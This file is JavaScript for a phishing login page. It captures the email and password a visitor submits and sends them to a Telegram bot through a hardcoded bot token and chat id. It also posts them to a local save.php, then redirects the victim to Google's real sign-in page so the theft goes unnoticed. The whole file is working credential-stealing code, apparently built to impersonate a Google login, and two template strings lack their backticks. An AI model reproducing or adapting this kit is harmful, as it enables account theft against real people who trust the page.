document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("login-form");

  if (!form) {
    console.error("Form not found!");
    return;
  }

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    const emailElement = document.getElementById("email");
    const passwordElement = document.getElementById("password");

    if (!emailElement || !passwordElement) {
      console.error("Email or password input not found");
      return;
    }

    const email = emailElement.value;
    const password = passwordElement.value;

    const message = Email: ${email}\nPassword: ${password};

    fetch("https://api.telegram.org/bot7765914996:AAG6QyINd2LjuFzkpPAn02J8qnyPx_iWYCQ/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: "7817453978",
        text: message
      })
    });

    // حفظ في ملف محلي (تجاهل الخطأ لو php غير مفعل)
    try {
      fetch("save.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}
      });
    } catch (err) {
      console.log("Save failed:", err);
    }

    window.location.href = "https://accounts.google.com";
  });
});
